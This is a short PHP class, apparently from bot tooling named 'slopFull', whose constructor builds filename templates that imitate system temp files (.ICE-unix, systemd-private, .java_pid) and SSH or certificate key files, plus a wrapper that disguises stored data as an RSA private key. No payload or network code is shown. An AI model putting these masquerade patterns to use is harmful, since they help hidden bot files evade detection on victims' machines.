<?php

namespace new_bots\slop_full;

class slopFull
{
    protected bool $useCert;
    protected bool $randomizeCert;
    private array $niceSafeStrings;
    private array $certSpoofer;
    private array $certNameCandidates;


    function __construct(string | null $key, bool $use509, bool $spoofAsCert, bool $onDiskBotStorage)
    {
        $this->useCert = $use509;
        if ($spoofAsCert) {
            $this->certNameCandidates = [
                "single" => [
                    "%s_key.pem",
                    "%s_key.crt",
                    "%s_key.der",
                    "%s_key.pgp",
                    "%s_key.cert",
                    "%s_key.lsa",
                ],
                "quad" => [
                    "%s%s%s_%s",
                    "id_%s-%s.rsa",
                ],
                "double" => [
                    "id_%s-%s.ed25519"
                ]
            ];
            $this->certSpoofer = [
                "-----BEGIN RSA PRIVATE KEY-----",
                "%s",
                "-----END RSA PRIVATE KEY-----"
            ];
        }
        $this->niceSafeStrings = [
            "single" => [
                ".ICE-unix-%s",
                ".font-unix-%s",
                ".java_pid%s",
                "ssh-XXXXXX%s",
            ],
            "trio" => [
                "systemd-private-%s-%s.service-%s",
            ],
            "fiver" => [
                "Temp-%s-%s-%s-%s-%s"
            ]
        ];
    }

}